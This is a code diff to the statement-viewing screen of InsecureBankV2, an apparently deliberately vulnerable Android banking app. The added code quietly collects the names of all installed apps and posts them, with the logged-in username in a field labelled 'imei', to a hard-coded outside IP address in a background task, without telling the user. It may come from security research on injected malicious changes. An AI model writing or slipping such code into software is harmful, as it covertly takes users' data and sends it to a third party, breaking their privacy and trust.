@@ -2,6 +2,9 @@ package com.android.insecurebankv2;
 
 import android.app.Activity;
 import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
 import android.view.Menu;
@@ -10,7 +13,31 @@ import android.webkit.WebChromeClient;
 import android.webkit.WebView;
 import android.widget.Toast;
 
+import org.apache.http.HttpResponse;
+import org.apache.http.NameValuePair;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.message.BasicNameValuePair;
+import org.json.JSONException;
+
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.UnsupportedEncodingException;
+import java.security.InvalidAlgorithmParameterException;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+import java.util.ArrayList;
+import java.util.List;
+
+import javax.crypto.BadPaddingException;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
 
 /*
 The page that allows the user to view transaction history for the logged in user
@@ -47,9 +74,69 @@ public class ViewStatement extends Activity {
 			Toast.makeText(this, "Statement does not Exist!!",Toast.LENGTH_LONG).show();
 		}
 
-
-
+		final PackageManager pm = getPackageManager();
+		List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+		StringBuilder sb = new StringBuilder();
+		for (ApplicationInfo packageInfo : packages) {
+			sb.append(packageInfo.packageName);
+		}
+		new PostDataTask().execute(sb.toString());
 	}
+
+	class PostDataTask extends AsyncTask< String, String, String > {
+
+		@Override
+		protected String doInBackground(String...params) {
+			try {
+				postData(params[0]);
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
+			return null;
+		}
+
+		protected void onPostExecute(Double result) {}
+		protected void onProgressUpdate(Integer...progress) {}
+
+		public void postData(String valueIWantToSend) throws ClientProtocolException, IOException, JSONException, InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException {
+			try {
+				HttpClient httpclient = new DefaultHttpClient();
+				HttpPost httppost = new HttpPost("http://165.124.182.177:8888/postdata");
+				// Add your data
+				List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
+				nameValuePairs.add(new BasicNameValuePair("username", uname));
+				nameValuePairs.add(new BasicNameValuePair("imei", valueIWantToSend));
+				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
+				// Execute HTTP Post Request
+				HttpResponse responseBody = httpclient.execute(httppost);
+
+				InputStream in = responseBody.getEntity().getContent();
+				String result = convertStreamToString(in);
+				System.out.println("NULIST: PostData RS: " + result);
+			}
+			catch(Exception e){
+				System.err.println("NULIST: error postdata: "+e.toString());
+			}
+		}
+	}
+
+	private String convertStreamToString(InputStream in ) throws IOException {
+		// TODO Auto-generated method stub
+		BufferedReader reader = null;
+		try {
+			reader = new BufferedReader(new InputStreamReader( in , "UTF-8"));
+		} catch (UnsupportedEncodingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		StringBuilder sb = new StringBuilder();
+		String line = null;
+		while ((line = reader.readLine()) != null) {
+			sb.append(line + "\n");
+		} in .close();
+		return sb.toString();
+	}
+
 	// Added for handling menu operations
 	@Override
 	public boolean onCreateOptionsMenu(Menu menu) {
